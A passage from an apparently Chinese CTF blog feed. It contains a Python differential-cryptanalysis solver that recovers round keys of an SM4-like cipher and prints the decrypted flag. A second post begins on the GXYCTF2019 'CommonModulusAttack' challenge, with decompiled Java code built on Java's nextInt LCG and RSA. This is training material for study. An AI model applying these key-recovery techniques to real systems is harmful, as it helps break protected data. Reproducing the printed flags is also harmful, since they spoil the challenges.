get_uint32_be(k_out)</span><br><span class="line">    k_out = k_out ^^ (rotl(k_out, <span class="number">13</span>)) ^^ (rotl(k_out, <span class="number">23</span>))</span><br><span class="line">    key0 = key4 ^^ k_out</span><br><span class="line">    <span class="keyword">return</span> key0</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">crack_key_31</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">global</span> cipher1</span><br><span class="line">    key_31 = [set(range(<span class="number">0x100</span>)), set(range(<span class="number">0x100</span>)), set(range(<span class="number">0x100</span>)), set(range(<span class="number">0x100</span>))]</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">5</span>):</span><br><span class="line">        ct, ct_diff = cipher1[i][<span class="number">0</span>], cipher1[i][<span class="number">1</span>]</span><br><span class="line">        ct_list = put_uint128_be(ct)</span><br><span class="line">        ct_diff_list = put_uint128_be(ct_diff)</span><br><span class="line">        y_diff = put_uint32_be(inv_L(ct_diff_list[<span class="number">3</span>] ^^ <span class="number">0x00000022</span>))</span><br><span class="line">        x_diff = put_uint32_be(ct_diff_list[<span class="number">0</span>] ^^ ct_diff_list[<span class="number">1</span>] ^^ ct_diff_list[<span class="number">2</span>])</span><br><span class="line">        x = put_uint32_be(ct_list[<span class="number">0</span>] ^^ ct_list[<span class="number">1</span>] ^^ ct_list[<span class="number">2</span>])</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">4</span>):</span><br><span class="line">            key_31_candidate = set()</span><br><span class="line">            <span class="keyword">for</span> _ <span class="keyword">in</span> diff_dist[(x_diff[j], y_diff[j])]:</span><br><span class="line">                key_31_candidate.add(x[j] ^^ _)</span><br><span class="line">            key_31[j] = key_31[j] &amp; key_31_candidate</span><br><span class="line">        status = <span class="literal">True</span></span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">4</span>):</span><br><span class="line">            <span class="keyword">if</span> len(key_31[j]) &gt; <span class="number">2</span>:</span><br><span class="line">                status = <span class="literal">False</span></span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">if</span> status:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">5</span>, <span class="number">10</span>):</span><br><span class="line">        ct, ct_diff = cipher1[i][<span class="number">0</span>], cipher1[i][<span class="number">1</span>]</span><br><span class="line">        ct_list = put_uint128_be(ct)</span><br><span class="line">        ct_diff_list = put_uint128_be(ct_diff)</span><br><span class="line">        y_diff = put_uint32_be(inv_L(ct_diff_list[<span class="number">3</span>] ^^ <span class="number">0x00000033</span>))</span><br><span class="line">        x_diff = put_uint32_be(ct_diff_list[<span class="number">0</span>] ^^ ct_diff_list[<span class="number">1</span>] ^^ ct_diff_list[<span class="number">2</span>])</span><br><span class="line">        x = put_uint32_be(ct_list[<span class="number">0</span>] ^^ ct_list[<span class="number">1</span>] ^^ ct_list[<span class="number">2</span>])</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">4</span>):</span><br><span class="line">            key_31_candidate = set()</span><br><span class="line">            <span class="keyword">for</span> _ <span class="keyword">in</span> diff_dist[(x_diff[j], y_diff[j])]:</span><br><span class="line">                key_31_candidate.add(x[j] ^^ _)</span><br><span class="line">            key_31[j] = key_31[j] &amp; key_31_candidate</span><br><span class="line">        status = <span class="literal">True</span></span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">4</span>):</span><br><span class="line">            <span class="keyword">if</span> len(key_31[j]) &gt; <span class="number">1</span>:</span><br><span class="line">                status = <span class="literal">False</span></span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">if</span> status:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="comment"># print(key_31)</span></span><br><span class="line">    key_31 = get_uint32_be([list(_)[<span class="number">0</span>] <span class="keyword">for</span> _ <span class="keyword">in</span> key_31])</span><br><span class="line">    print(<span class="string">"[+] KEY_31: "</span> + hex(key_31)[<span class="number">2</span>:].rjust(<span class="number">8</span>, <span class="string">'0'</span>))</span><br><span class="line">    <span class="keyword">return</span> key_31</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">crack_key_30</span><span class="params">(key_31)</span>:</span></span><br><span class="line">    <span class="keyword">global</span> cipher1</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">5</span>):</span><br><span class="line">        cipher1[i] = (dec_one_round(cipher1[i][<span class="number">0</span>], key_31), get_uint128_be([<span class="number">0x00000022</span>] + put_uint128_be(cipher1[i][<span class="number">1</span>])[:<span class="number">3</span>]))</span><br><span class="line">        cipher1[i+<span class="number">5</span>] = (dec_one_round(cipher1[i+<span class="number">5</span>][<span class="number">0</span>], key_31), get_uint128_be([<span class="number">0x00000033</span>] + put_uint128_be(cipher1[i+<span class="number">5</span>][<span class="number">1</span>])[:<span class="number">3</span>]))</span><br><span class="line">    key_30 = [set(range(<span class="number">0x100</span>)), set(range(<span class="number">0x100</span>)), set(range(<span class="number">0x100</span>)), set(range(<span class="number">0x100</span>))]</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">5</span>):</span><br><span class="line">        ct, ct_diff = cipher1[i][<span class="number">0</span>], cipher1[i][<span class="number">1</span>]</span><br><span class="line">        ct_list = put_uint128_be(ct)</span><br><span class="line">        ct_diff_list = put_uint128_be(ct_diff)</span><br><span class="line">        y_diff = put_uint32_be(inv_L(ct_diff_list[<span class="number">3</span>]))</span><br><span class="line">        x_diff = put_uint32_be(ct_diff_list[<span class="number">0</span>] ^^ ct_diff_list[<span class="number">1</span>] ^^ ct_diff_list[<span class="number">2</span>])</span><br><span class="line">        x = put_uint32_be(ct_list[<span class="number">0</span>] ^^ ct_list[<span class="number">1</span>] ^^ ct_list[<span class="number">2</span>])</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">4</span>):</span><br><span class="line">            key_30_candidate = set()</span><br><span class="line">            <span class="keyword">for</span> _ <span class="keyword">in</span> diff_dist[(x_diff[j], y_diff[j])]:</span><br><span class="line">                key_30_candidate.add(x[j] ^^ _)</span><br><span class="line">            key_30[j] = key_30[j] &amp; key_30_candidate</span><br><span class="line">        status = <span class="literal">True</span></span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">4</span>):</span><br><span class="line">            <span class="keyword">if</span> len(key_30[j]) &gt; <span class="number">2</span>:</span><br><span class="line">                status = <span class="literal">False</span></span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">if</span> status:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">5</span>, <span class="number">10</span>):</span><br><span class="line">        ct, ct_diff = cipher1[i][<span class="number">0</span>], cipher1[i][<span class="number">1</span>]</span><br><span class="line">        ct_list = put_uint128_be(ct)</span><br><span class="line">        ct_diff_list = put_uint128_be(ct_diff)</span><br><span class="line">        y_diff = put_uint32_be(inv_L(ct_diff_list[<span class="number">3</span>]))</span><br><span class="line">        x_diff = put_uint32_be(ct_diff_list[<span class="number">0</span>] ^^ ct_diff_list[<span class="number">1</span>] ^^ ct_diff_list[<span class="number">2</span>])</span><br><span class="line">        x = put_uint32_be(ct_list[<span class="number">0</span>] ^^ ct_list[<span class="number">1</span>] ^^ ct_list[<span class="number">2</span>])</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">4</span>):</span><br><span class="line">            key_30_candidate = set()</span><br><span class="line">            <span class="keyword">for</span> _ <span class="keyword">in</span> diff_dist[(x_diff[j], y_diff[j])]:</span><br><span class="line">                key_30_candidate.add(x[j] ^^ _)</span><br><span class="line">            key_30[j] = key_30[j] &amp; key_30_candidate</span><br><span class="line">        status = <span class="literal">True</span></span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">4</span>):</span><br><span class="line">            <span class="keyword">if</span> len(key_30[j]) &gt; <span class="number">1</span>:</span><br><span class="line">                status = <span class="literal">False</span></span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">if</span> status:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="comment"># print(key_30)</span></span><br><span class="line">    key_30 = get_uint32_be([list(_)[<span class="number">0</span>] <span class="keyword">for</span> _ <span class="keyword">in</span> key_30])</span><br><span class="line">    print(<span class="string">"[+] KEY_30: "</span> + hex(key_30)[<span class="number">2</span>:].rjust(<span class="number">8</span>, <span class="string">'0'</span>))</span><br><span class="line">    <span class="keyword">return</span> key_30</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">crack_key_29</span><span class="params">(key_30)</span>:</span></span><br><span class="line">    <span class="keyword">global</span> cipher1</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">10</span>):</span><br><span class="line">        cipher1[i] = (dec_one_round(cipher1[i][<span class="number">0</span>], key_30), get_uint128_be([<span class="number">0x00000000</span>] + put_uint128_be(cipher1[i][<span class="number">1</span>])[:<span class="number">3</span>]))</span><br><span class="line">    key_29 = [set(range(<span class="number">0x100</span>)), set(range(<span class="number">0x100</span>)), set(range(<span class="number">0x100</span>)), set(range(<span class="number">0x100</span>))]</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">5</span>):</span><br><span class="line">        ct, ct_diff = cipher1[i][<span class="number">0</span>], cipher1[i][<span class="number">1</span>]</span><br><span class="line">        ct_list = put_uint128_be(ct)</span><br><span class="line">        ct_diff_list = put_uint128_be(ct_diff)</span><br><span class="line">        y_diff = put_uint32_be(inv_L(ct_diff_list[<span class="number">3</span>]))</span><br><span class="line">        x_diff = put_uint32_be(ct_diff_list[<span class="number">0</span>] ^^ ct_diff_list[<span class="number">1</span>] ^^ ct_diff_list[<span class="number">2</span>])</span><br><span class="line">        x = put_uint32_be(ct_list[<span class="number">0</span>] ^^ ct_list[<span class="number">1</span>] ^^ ct_list[<span class="number">2</span>])</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">4</span>):</span><br><span class="line">            key_29_candidate = set()</span><br><span class="line">            <span class="keyword">for</span> _ <span class="keyword">in</span> diff_dist[(x_diff[j], y_diff[j])]:</span><br><span class="line">                key_29_candidate.add(x[j] ^^ _)</span><br><span class="line">            key_29[j] = key_29[j] &amp; key_29_candidate</span><br><span class="line">        status = <span class="literal">True</span></span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">4</span>):</span><br><span class="line">            <span class="keyword">if</span> len(key_29[j]) &gt; <span class="number">2</span>:</span><br><span class="line">                status = <span class="literal">False</span></span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">if</span> status:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">5</span>, <span class="number">10</span>):</span><br><span class="line">        ct, ct_diff = cipher1[i][<span class="number">0</span>], cipher1[i][<span class="number">1</span>]</span><br><span class="line">        ct_list = put_uint128_be(ct)</span><br><span class="line">        ct_diff_list = put_uint128_be(ct_diff)</span><br><span class="line">        y_diff = put_uint32_be(inv_L(ct_diff_list[<span class="number">3</span>]))</span><br><span class="line">        x_diff = put_uint32_be(ct_diff_list[<span class="number">0</span>] ^^ ct_diff_list[<span class="number">1</span>] ^^ ct_diff_list[<span class="number">2</span>])</span><br><span class="line">        x = put_uint32_be(ct_list[<span class="number">0</span>] ^^ ct_list[<span class="number">1</span>] ^^ ct_list[<span class="number">2</span>])</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">4</span>):</span><br><span class="line">            key_29_candidate = set()</span><br><span class="line">            <span class="keyword">for</span> _ <span class="keyword">in</span> diff_dist[(x_diff[j], y_diff[j])]:</span><br><span class="line">                key_29_candidate.add(x[j] ^^ _)</span><br><span class="line">            key_29[j] = key_29[j] &amp; key_29_candidate</span><br><span class="line">        status = <span class="literal">True</span></span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">4</span>):</span><br><span class="line">            <span class="keyword">if</span> len(key_29[j]) &gt; <span class="number">1</span>:</span><br><span class="line">                status = <span class="literal">False</span></span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">if</span> status:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="comment"># print(key_29)</span></span><br><span class="line">    key_29 = get_uint32_be([list(_)[<span class="number">0</span>] <span class="keyword">for</span> _ <span class="keyword">in</span> key_29])</span><br><span class="line">    print(<span class="string">"[+] KEY_29: "</span> + hex(key_29)[<span class="number">2</span>:].rjust(<span class="number">8</span>, <span class="string">'0'</span>))</span><br><span class="line">    <span class="keyword">return</span> key_29</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">crack_key_28</span><span class="params">(key_31, key_30, key_29)</span>:</span></span><br><span class="line">    <span class="keyword">global</span> cipher2</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">5</span>):</span><br><span class="line">        cipher2[i] = (dec_one_round(cipher2[i][<span class="number">0</span>], key_31), dec_one_round(cipher2[i][<span class="number">1</span>], key_31))</span><br><span class="line">        cipher2[i] = (dec_one_round(cipher2[i][<span class="number">0</span>], key_30), dec_one_round(cipher2[i][<span class="number">1</span>], key_30))</span><br><span class="line">        cipher2[i] = (dec_one_round(cipher2[i][<span class="number">0</span>], key_29), dec_one_round(cipher2[i][<span class="number">1</span>], key_29))</span><br><span class="line">        cipher2[i+<span class="number">5</span>] = (dec_one_round(cipher2[i+<span class="number">5</span>][<span class="number">0</span>], key_31), dec_one_round(cipher2[i+<span class="number">5</span>][<span class="number">1</span>], key_31))</span><br><span class="line">        cipher2[i+<span class="number">5</span>] = (dec_one_round(cipher2[i+<span class="number">5</span>][<span class="number">0</span>], key_30), dec_one_round(cipher2[i+<span class="number">5</span>][<span class="number">1</span>], key_30))</span><br><span class="line">        cipher2[i+<span class="number">5</span>] = (dec_one_round(cipher2[i+<span class="number">5</span>][<span class="number">0</span>], key_29), dec_one_round(cipher2[i+<span class="number">5</span>][<span class="number">1</span>], key_29))</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">10</span>):</span><br><span class="line">        cipher2[i] = (cipher2[i][<span class="number">0</span>], cipher2[i][<span class="number">0</span>] ^^ cipher2[i][<span class="number">1</span>])</span><br><span class="line">    key_28 = [set(range(<span class="number">0x100</span>)), set(range(<span class="number">0x100</span>)), set(range(<span class="number">0x100</span>)), set(range(<span class="number">0x100</span>))]</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">5</span>):</span><br><span class="line">        ct, ct_diff = cipher2[i][<span class="number">0</span>], cipher2[i][<span class="number">1</span>]</span><br><span class="line">        ct_list = put_uint128_be(ct)</span><br><span class="line">        ct_diff_list = put_uint128_be(ct_diff)</span><br><span class="line">        y_diff = put_uint32_be(inv_L(ct_diff_list[<span class="number">3</span>] ^^ <span class="number">0x00000022</span>))</span><br><span class="line">        x_diff = put_uint32_be(ct_diff_list[<span class="number">0</span>] ^^ ct_diff_list[<span class="number">1</span>] ^^ ct_diff_list[<span class="number">2</span>])</span><br><span class="line">        x = put_uint32_be(ct_list[<span class="number">0</span>] ^^ ct_list[<span class="number">1</span>] ^^ ct_list[<span class="number">2</span>])</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">4</span>):</span><br><span class="line">            key_28_candidate = set()</span><br><span class="line">            <span class="keyword">for</span> _ <span class="keyword">in</span> diff_dist[(x_diff[j], y_diff[j])]:</span><br><span class="line">                key_28_candidate.add(x[j] ^^ _)</span><br><span class="line">            key_28[j] = key_28[j] &amp; key_28_candidate</span><br><span class="line">        status = <span class="literal">True</span></span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">4</span>):</span><br><span class="line">            <span class="keyword">if</span> len(key_28[j]) &gt; <span class="number">2</span>:</span><br><span class="line">                status = <span class="literal">False</span></span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">if</span> status:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">5</span>, <span class="number">10</span>):</span><br><span class="line">        ct, ct_diff = cipher2[i][<span class="number">0</span>], cipher2[i][<span class="number">1</span>]</span><br><span class="line">        ct_list = put_uint128_be(ct)</span><br><span class="line">        ct_diff_list = put_uint128_be(ct_diff)</span><br><span class="line">        y_diff = put_uint32_be(inv_L(ct_diff_list[<span class="number">3</span>] ^^ <span class="number">0x00000033</span>))</span><br><span class="line">        x_diff = put_uint32_be(ct_diff_list[<span class="number">0</span>] ^^ ct_diff_list[<span class="number">1</span>] ^^ ct_diff_list[<span class="number">2</span>])</span><br><span class="line">        x = put_uint32_be(ct_list[<span class="number">0</span>] ^^ ct_list[<span class="number">1</span>] ^^ ct_list[<span class="number">2</span>])</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">4</span>):</span><br><span class="line">            key_28_candidate = set()</span><br><span class="line">            <span class="keyword">for</span> _ <span class="keyword">in</span> diff_dist[(x_diff[j], y_diff[j])]:</span><br><span class="line">                key_28_candidate.add(x[j] ^^ _)</span><br><span class="line">            key_28[j] = key_28[j] &amp; key_28_candidate</span><br><span class="line">        status = <span class="literal">True</span></span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">4</span>):</span><br><span class="line">            <span class="keyword">if</span> len(key_28[j]) &gt; <span class="number">1</span>:</span><br><span class="line">                status = <span class="literal">False</span></span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">if</span> status:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    key_28 = get_uint32_be([list(_)[<span class="number">0</span>] <span class="keyword">for</span> _ <span class="keyword">in</span> key_28])</span><br><span class="line">    print(<span class="string">"[+] KEY_28: "</span> + hex(key_28)[<span class="number">2</span>:].rjust(<span class="number">8</span>, <span class="string">'0'</span>))</span><br><span class="line">    <span class="keyword">return</span> key_28</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decrypt</span><span class="params">(enc_flag, key)</span>:</span></span><br><span class="line">    flag = <span class="string">b''</span></span><br><span class="line">    cur_key = key.copy()</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">31</span>, <span class="number">3</span>, <span class="number">-1</span>):</span><br><span class="line">        cur_key = [inv_key(cur_key, i)] + cur_key[:<span class="number">3</span>]</span><br><span class="line">        key = [cur_key[<span class="number">0</span>]] + key</span><br><span class="line">    print(key)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>, len(enc_flag), <span class="number">32</span>):</span><br><span class="line">        ct = int(enc_flag[i:i+<span class="number">32</span>], <span class="number">16</span>)</span><br><span class="line">        ct = put_uint128_be(ct)[::<span class="number">-1</span>]</span><br><span class="line">        ct = get_uint128_be(ct)</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">32</span>):</span><br><span class="line">            ct = dec_one_round(ct, key[<span class="number">31</span>-j])</span><br><span class="line">        flag += long_to_bytes(ct)</span><br><span class="line">    <span class="keyword">return</span> flag</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    print(<span class="string">"[+] ENC_FLAG: "</span> + enc_flag)</span><br><span class="line">    key_31 = crack_key_31()</span><br><span class="line">    key_30 = crack_key_30(key_31)</span><br><span class="line">    key_29 = crack_key_29(key_30)</span><br><span class="line">    key_28 = crack_key_28(key_31, key_30, key_29)</span><br><span class="line">    flag = decrypt(enc_flag, [key_28, key_29, key_30, key_31])</span><br><span class="line">    print(<span class="string">"[+] FLAG: "</span>, end=<span class="string">""</span>)</span><br><span class="line">    print(flag)</span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">[+] ENC_FLAG: 727c7eaf8523804472be1ff976134a65d73adba28d7345930e093b85afda0ac5b5656f7514c7736aac88a71bb6643d74</span></span><br><span class="line"><span class="string">[+] KEY_31: 0fbe90cc</span></span><br><span class="line"><span class="string">[+] KEY_30: 16c7d67f</span></span><br><span class="line"><span class="string">[+] KEY_29: 35391715</span></span><br><span class="line"><span class="string">[+] KEY_28: f28f45db</span></span><br><span class="line"><span class="string">[3882886102, 2010179002, 1572873813, 3432904981, 3427876090, 3281517115, 2835549035, 4196177867, 1356056259, 2774742866, 1808643826, 2696649042, 654419433, 3294131222, 1850743528, 2512000155, 2125249481, 1701367673, 2144276591, 2240982232, 3335194424, 4293333648, 2630048960, 3717105645, 3211860000, 304813210, 2907456674, 334588889, 4069475803, 892933909, 382195327, 264147148]</span></span><br><span class="line"><span class="string">[+] FLAG: b'flag&#123;a9028a9c58c5749cdad329c09c80cc1b&#125;\n\n\n\n\n\n\n\n\n\n'</span></span><br><span class="line"><span class="string">'''</span></span><br></pre></td></tr></table></figure><h4 id="link">[Link]</h4><p><a href="https://eprint.iacr.org/2010/063.pdf" target="_blank" rel="noopener">https://eprint.iacr.org/2010/063.pdf</a></p><h3 id="flag_system">flag_system</h3><h4 id="题解分析-2">[题解分析]</h4><p>魔改md5碰撞题- -就只有长亭拿了个一血（以后有空再补吧</p>]]></content>
      
      
      <categories>
          
          <category> WriteUp </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>CTF-Training-Record-2</title>
      <link href="/2020/08/12/CTF-Training-Record-2/"/>
      <url>/2020/08/12/CTF-Training-Record-2/</url>
      
        <content type="html"><![CDATA[<h3 id="gxyctf2019---commonmodulusattack">GXYCTF2019 - CommonModulusAttack</h3><h4 id="题目考点">[题目考点]</h4><ul><li><a href="https://www.slideshare.net/phdays/java-35303854" target="_blank" rel="noopener">Java <code>nextInt()</code> using Truncated LCG</a></li></ul><h4 id="题目文件">[题目文件]</h4><p><a href="GXYCTF2019-CMA.zip">Click Here to Download</a></p><h4 id="题解分析">[题解分析]</h4><p>并不知道和题目名字有什么关系- -</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] paramArrayOfString)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  CommonModulusAttack localCommonModulusAttack = <span class="keyword">new</span> CommonModulusAttack();</span><br><span class="line">  localCommonModulusAttack.oldtest();</span><br><span class="line">  localCommonModulusAttack.initseed();</span><br><span class="line">  localCommonModulusAttack.gen_states();</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">24</span>; i++) &#123;</span><br><span class="line">    localCommonModulusAttack.lrandout();</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">try</span></span><br><span class="line">  &#123;</span><br><span class="line">    PrintWriter localPrintWriter = <span class="keyword">new</span> PrintWriter(<span class="string">"new.txt"</span>, <span class="string">"UTF-8"</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; <span class="number">24</span>; j++) &#123;</span><br><span class="line">      localPrintWriter.println(byte2hex(localCommonModulusAttack.lrandout()));</span><br><span class="line">    &#125;</span><br><span class="line">    localPrintWriter.close();</span><br><span class="line">  &#125;</span><br><span class="line">  ...</span><br></pre></td></tr></table></figure><p><strong>关键代码</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// key code (oldtest)</span></span><br><span class="line">PrintWriter localPrintWriter = <span class="keyword">new</span> PrintWriter(<span class="string">"old.txt"</span>, <span class="string">"UTF-8"</span>);</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">20</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">int</span> j = <span class="keyword">this</span>.random.nextInt();</span><br><span class="line">  localPrintWriter.println(j);</span><br><span class="line">&#125;</span><br><span class="line">localPrintWriter.close();</span><br><span class="line"></span><br><span class="line"><span class="comment">// key code (initseed)</span></span><br><span class="line">Scanner localScanner = <span class="keyword">new</span> Scanner(Paths.get(<span class="string">"flag"</span>, <span class="keyword">new</span> String[<span class="number">0</span>]), <span class="string">"UTF-8"</span>);</span><br><span class="line">String str1 = localScanner.next();</span><br><span class="line">String str2 = convert_2_binary(str1);</span><br><span class="line"><span class="keyword">this</span>.seed = str2; <span class="comment">// so what we need is `this.seed`</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// key code (generate_init_state)</span></span><br><span class="line">BigInteger localBigInteger = BigInteger.valueOf(<span class="number">0L</span>);</span><br><span class="line"><span class="keyword">char</span>[] arrayOfChar1 = <span class="keyword">this</span>.seed.toCharArray(); <span class="comment">// seed's first encryption</span></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> k : arrayOfChar1) &#123;</span><br><span class="line">  localBigInteger = localBigInteger.shiftLeft(<span class="number">1</span>);</span><br><span class="line">  <span class="keyword">if</span> (k == <span class="number">49</span>) &#123; <span class="comment">// k == '1'</span></span><br><span class="line">    localBigInteger = localBigInteger.xor(<span class="keyword">new</span> BigInteger(<span class="keyword">this</span>.seed, <span class="number">2</span>));</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> (localBigInteger.shiftRight(<span class="number">256</span>) != BigInteger.ZERO) &#123;</span><br><span class="line">    localBigInteger = localBigInteger.xor(<span class="keyword">new</span> BigInteger(<span class="string">"10000000000000000000000000000000000000000000000000000000000000223"</span>, <span class="number">16</span>));</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> localBigInteger;</span><br><span class="line"></span><br><span class="line"><span class="comment">// key code (gen_states)</span></span><br><span class="line">BigInteger localBigInteger1 = generate_init_state(); <span class="comment">// what we want(seed after first encryption)</span></span><br><span class="line">BigInteger localBigInteger2 = BigInteger.valueOf(<span class="number">17L</span>); <span class="comment">// param e in RSA</span></span><br><span class="line">ArrayList localArrayList1 = <span class="keyword">new</span> ArrayList(<span class="number">24</span>);</span><br><span class="line">ArrayList localArrayList2 = <span class="keyword">new</span> ArrayList(<span class="number">24</span>);</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">24</span>; i++) &#123;</span><br><span class="line">  BigInteger localBigInteger3 = BigInteger.probablePrime(<span class="number">512</span>, <span class="keyword">this</span>.random); <span class="comment">// p</span></span><br><span class="line">  BigInteger localBigInteger4 = BigInteger.probablePrime(<span class="number">512</span>, <span class="keyword">this</span>.random); <span class="comment">// q</span></span><br><span class="line">  BigInteger localBigInteger5 = localBigInteger3.multiply(localBigInteger4); <span class="comment">// n</span></span><br><span class="line">  BigInteger localBigInteger6 = localBigInteger1.modPow(localBigInteger2, localBigInteger5); <span class="comment">// c</span></span><br><span class="line">  localArrayList1.add(localBigInteger5);</span><br><span class="line">  localArrayList2.add(localBigInteger6);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">  PrintWriter localPrintWriter = <span class="keyword">new</span> PrintWriter(<span class="string">"product"</span>, <span class="string">"UTF-8"</span>);</span><br><span 